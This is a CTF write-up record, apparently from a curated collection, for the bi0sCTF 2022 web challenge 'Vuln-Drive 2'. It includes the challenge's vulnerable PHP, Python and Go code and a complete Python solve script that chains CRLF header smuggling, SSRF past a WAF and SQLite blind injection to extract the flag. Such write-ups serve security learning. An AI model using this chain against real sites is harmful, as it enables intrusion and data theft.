---
title: Vuln-Drive 2 – bi0sCTF22
contest: bi0sCTF 2022
year: 2022
difficulty: medium
vuln_type: sqli
tags:
- smuggling_path
- http_request_split
- waf_bypass
- sqlite_sqli
- ssrf_internal
- flag_header_xprohacker
- file_get_contents
- custom_http_in_post
attack_chain: 'docker-compose 三层架构 frontend/waf/app → view.php?file=chdir 后 file_get_contents 读文件 (txt 后缀限制) → upload path= 路径穿越 + file content 是构造的 HTTP 请求 (含 X-pro-hacker: Pro-hacker + flag: gimme + Token header) → 通过 smuggling 绕过 waf 直达 app → SQLite SQL 注入 user=a'',substr((select*from flag),{},1));-- → 盲注爆破 flag'
key_payload: 'X-pro-hacker: Pro-hacker + flag: gimme + Content-Type: application/x-www-form-urlencoded + user=a'',substr((select*from flag),{},1));-- + Token: 16 字符'
one_liner: bi0sCTF 2022 Vuln-Drive 2 WAF 绕过，HTTP smuggling 把含 SQL 注入的 HTTP 请求塞进 multipart 上传，绕过 waf 直达内网 app。
lesson: 经典 "HTTP smuggling via POST body"：上传文件内容实际是合法 HTTP 请求，被后端 view.php 转发到内网 app，绕开 WAF 检查。
quality: high
full_path: Vuln-Drive_2_–_bi0sCTF22.full.md
meta_path: Vuln-Drive_2_–_bi0sCTF22.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Vuln-Drive 2 – bi0sCTF22。bi0sCTF 2022 Vuln-Drive 2 WAF 绕过，HTTP smuggling 把含 SQL 注入的 HTTP 请求塞进 multipart 上传，绕过 waf 直达内网 app。。经验：经典 "HTTP smuggling via POST body"：上传文件内容实际是合法 HTTP 请求，被后端 ...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/94174.html
reasoning_chain:
- 触发点：docker-compose 三层架构 frontend/waf/app + frontend 接受 ?file= + 限制 .txt 后缀 → 假设：必须绕过 waf 抵达 app
- view.php 代码：$ext=explode('.', $file); $type=substr(strtolower(end($ext)),0,3); if($type==='txt') chdir($FOLDER); echo file_get_contents($_GET['file'])
- 假设：chdir 后 file_get_contents 仍读 $_GET['file']，且限制仅 3 字符后缀 → 触发点：路径穿越 + txt 后缀绕过
- 动作：upload.php 用 path=路径 + file 内容 → 假设：上传文件 content 是合法 HTTP 请求 → wapp 转发至后端 app
- '假设：smuggling 绕过 waf → 内容 HTTP 请求带 X-pro-hacker: Pro-hacker + flag: gimme + Token header'
- '动作：构造 hello\r\nHost: localhost\r\nX-pro_hacker: Pro-hacker\r\nToken: 16char\r\nflag: hello\r\nflag: gimme\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nuser=a'',substr((select*from flag),{},1));--'
- 假设：app 检查 Token[:16] 后拼 SELECT * FROM users WHERE token='...' → SQLite SQL 注入
- 动作：盲注爆破 substr((select*from flag),{},1)) 1-indexed → for i in range(1,10) for letter in '1234567890abcdef'
- 观察：response 含 'not found' 后跟爆破字符 → flag 提取 → 假设：flag 表 flag_is_here TEXT 列存 flag
failed_attempts:
- 试图走 ?file= 路径直接读 flag.txt → 失败：chdir 后限制 file= 前缀仅能读 uploads 下文件
- 试图 upload path=../../ 路径穿越写文件 → 失败：上传是文件流被后端当作 HTTP 请求转发
- 试图直接 SELECT flag → 失败：substr 盲注必须逐字符爆破
key_observations:
- 经典 'HTTP smuggling via POST body'：上传文件内容实际是合法 HTTP 请求，被后端 view.php 转发到内网 app，绕开 WAF 检查
- app 检查 Token 后 SELECT 注入：token 字段字符串拼接 → 注入 user=a',substr((select*from flag),{},1));--
- header 注入 Content-Length 必须与 body 长度严格匹配才能被后端解析
- waf bypass 经典三段式：X-pro-hacker 头 + flag 头 + Token 头必须全合规
- SQLite 注入 SELECT * FROM flag 配合 substr 单字符提取盲注是 CTF 经典
prerequisites:
- HTTP 请求走私原理（Content-Length vs Transfer-Encoding）
- SQLite 注入语法（substr / 字符串拼接）
- WAF 绕过（白名单 header + smuggling）
- Python requests multipart 上传文件内容控制
- docker-compose 三层网络架构理解
---
# Vuln-Drive 2 – bi0sCTF22

> 原文: https://www.ctfiot.com/94174.html
> ID: 94174


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
services:
 frontend:
 build: ./php
 ports:
 - 8000:80
 ...
 networks:
 - frontend

 waf:
 build: ./waf
 networks:
 - frontend
 - backend
 ...
 on-failure
 app:
 build: ./app
 environment:
 - FLAG=fakeflag
 networks:
 - backend
 ...
networks:
 frontend:
 backend:
1
2
3
4
5
6
7
8
9
10
if(isset($_GET['file'])){
 $file = $_GET['file'];
 $ext = explode('.', $file);
 $type = substr(strtolower(end($ext)),0,3);
 $file = $FOLDER."/".$file;
 if($type==="txt"){
 try {
 if(file_exists($file)){
 chdir($FOLDER);
 echo file_get_contents($_GET['file']);
1
2
3
4
5
6
7
8
if($fileSize < 100000){
 $name = uniqid('', true).".".$fileActualExt;
 $fileDestination = $FOLDER.$_POST['path'];
 upload($file['tmp_name'], $fileDestination,$name);
 header("Location: index.php?uploadsuccess");
 }else{
 $error = "Your file is too big!";
 }
1
if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag")
1
2
3
4
5
6
7
8
if(r.Header.Get("X-pro-hacker")!=""){
 fmt.Fprintf(w, "Hello Hacker!\n")
 return
}
if(strings.Contains(r.Header.Get("flag"), "gimme")){
 fmt.Fprintf(w, "No flag For you!\n")
 return
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
CREATE TABLE IF NOT EXISTS users (
 username TEXT,
 token TEXT
 );
CREATE TABLE IF NOT EXISTS flag (
 flag_is_here TEXT
 );
Delete from users;
Delete from flag;
INSERT INTO users values ('user','some_randomtoken'),
 ('admi','some_randomtoken'),
 (
 'admin',
 '{FLAG}'
 );
INSERT INTO flag values ('{FLAG}');
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
if request.headers.get("Token"):
 token = request.headers.get("Token")
 token = token[:16]
 token = token.replace(" ","").replace('"',"")
 if request.form.get("user"):
 user = request.form.get("user")
 user = user[:38]
 add_user(user,token)
 query = f'SELECT * FROM users WHERE token="{token}"'
 res = db_query(query)
 res = res.fetchone()
 return res[1] if res and len(res[0])>0 else "INDEX\n"
 
except Exception as e:
 print(e)
 return "INDEX\n"
1
2
3
4
def add_user(user,token):
 q = f"INSERT INTO users values ('{user}','{token}')"
 db_query(q)
 return
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
import requests
import re
import string

    #url = "http://localhost:
8000"
url = "http://web.chall.bi0s.in:
8000"

S = requests.Session()
S.get(url)
S.post(url+'/login.php',data = {"username": "asdf","submit":"submit"} )
S.get(url+'/index.php?new=http:')
S.post(url+"/index.php",files={"file":('asdf.txt@waf','abc.txt')}, data={"submit":"submit","path":"http:"})

files= S.get(url+"/view.php?fol=http:").text
file = re.findall("<a href='(.*?)'>",files)
file = f"http://{file[0].replace('/view.php?file=http:/','')}"
print(file)

payload = """hello
Host: localhost
X-pro_hacker: Pro-hacker
Token: {}
flag: hello
flag: gimme
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

user=a',substr((select*from flag),{},1));--"""
flag = ""

for i in range(1,10):
 for letter in "1234567890abcdef":
 print("Trying....", letter)
 p = payload.format(letter,str(i))
 data = {"username": p.replace("\n","\r\n"),"submit":"submit"}

 S.post(url+'/login.php',data = data )

 res = S.get(url+f"/view.php?fol=.&file={file}").text

 match = re.findall("not found(.)",res)[0]
 #print(res)
 if letter == match:
 flag += letter
 print(flag)
 break
```
